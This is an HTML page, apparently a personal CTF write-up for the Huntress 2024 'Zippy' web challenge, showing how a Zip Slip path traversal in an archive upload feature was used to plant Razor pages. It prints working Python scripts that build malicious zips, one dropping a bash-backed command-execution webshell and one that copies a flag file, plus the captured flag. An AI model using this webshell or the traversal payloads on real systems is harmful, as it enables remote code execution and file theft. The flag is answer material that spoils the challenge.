@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2024-10-30 Zippy (Web) · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="huntress/2024/2024-10-30-zippy-web.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/huntress/index.html">Huntress CTF</a> &rsaquo; <a href="/huntress/2024/index.html">2024</a></div>
+  <h1 id="2024-10-30-zippy-web">2024-10-30 Zippy (Web)</h1>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Ok some archive management software</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Looking around for place to exploit, looks like write access to uploads, and the user ID is the folder #</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Can start to see the files uploaded</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>See specifically no check for path traversal</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Using Zip Slip to get files added above uploads</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>This works, we can also see and traverse above uploads.</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Now just have to figure out how to get the flag, struggled with rev and webshells for a while</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Zip file with Zip Slip.</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Can see some of the file directory now.</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Hmm some other errors</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Almost there, finally a webshell</p>
+<p><span class="img-missing">image unavailable</span></p>
+<pre><code class="language-python">import zipfile
+
+def create_razor_webshell_zip():
+webshell_content = &quot;&quot;&quot;@page
+@model AboutModel
+@{
+string cmdOutput = null;
+if (Request.Method == &quot;POST&quot;)
+{
+string command = Request.Form[&quot;command&quot;];
+cmdOutput = ExecuteCommand(command);
+}
+}
+
+&lt;h2&gt;Execute a Command&lt;/h2&gt;
+&lt;form method=&quot;post&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;command&quot; placeholder=&quot;Enter command&quot; style=&quot;width: 300px;&quot; /&gt;
+&lt;button type=&quot;submit&quot;&gt;Run Command&lt;/button&gt;
+&lt;/form&gt;
+
+@if (cmdOutput != null)
+{
+&lt;h3&gt;Output:&lt;/h3&gt;
+&lt;pre&gt;@cmdOutput&lt;/pre&gt;
+}
+
+@functions {
+private string ExecuteCommand(string command)
+{
+var output = new System.Text.StringBuilder();
+var process = new System.Diagnostics.Process();
+var startInfo = new System.Diagnostics.ProcessStartInfo
+{
+FileName = &quot;/bin/bash&quot;, // Use &quot;cmd.exe&quot; on Windows
+Arguments = &quot;-c \&quot; + command + \&quot;&quot;, // Corrected syntax for Arguments
+RedirectStandardOutput = true,
+RedirectStandardError = true,
+UseShellExecute = false,
+CreateNoWindow = true
+};
+
+    process.StartInfo = startInfo;
+    process.OutputDataReceived += (sender, args) =&gt; output.AppendLine(args.Data);
+    process.ErrorDataReceived += (sender, args) =&gt; output.AppendLine(args.Data);
+
+    process.Start();
+    process.BeginOutputReadLine();
+    process.BeginErrorReadLine();
+    process.WaitForExit();
+
+    return output.ToString();
+}
+
+}
+&quot;&quot;&quot;
+
+with zipfile.ZipFile('shell.zip', 'w') as z:
+    z.writestr('../../../../app/wwwroot/../../app/Pages/About.cshtml', webshell_content)
+
+create_razor_webshell_zip()
+</code></pre>
+<p>Final script that was working</p>
+<pre><code class="language-python">import zipfile
+
+def create_flag_reader_zip():
+    webshell_content = &quot;&quot;&quot;@page
+@model AboutModel
+@{
+    // Ensure using System.IO for file and path handling
+    string flagContent = null;
+    string flagPath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, &quot;../../../../app/flag.txt&quot;);
+    string outputPath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, &quot;../../../../app/wwwroot/uploads/0/flag.txt&quot;);
+
+    if (System.IO.File.Exists(flagPath))
+    {
+        // Read the flag file
+        flagContent = System.IO.File.ReadAllText(flagPath);
+
+        // Write the flag content to the output path
+        System.IO.File.WriteAllText(outputPath, flagContent);
+    }
+}
+
+&lt;h2&gt;Flag Reader&lt;/h2&gt;
+@if (flagContent != null)
+{
+    &lt;h3&gt;Flag content has been read and saved to /uploads/0/flag.txt&lt;/h3&gt;
+}
+else
+{
+    &lt;h3&gt;Flag file not found or an error occurred.&lt;/h3&gt;
+}
+&quot;&quot;&quot;
+
+    with zipfile.ZipFile('flag_reader.zip', 'w') as z:
+        z.writestr('../../../../app/wwwroot/../../app/Pages/FlagReader.cshtml', webshell_content)
+
+create_flag_reader_zip()
+</code></pre>
+<p>Instead, lets write flag to uploads folder.</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Get the contents, and there is the flag! Sometimes you have to take a step back, earlier I saw it could read the contents from a curl, and had to mix that with the access and reading the flag to a second location where we could read the data.</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<pre><code class="language-python">flag{a074eb7973c4c718790baefc096654dd}
+</code></pre>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
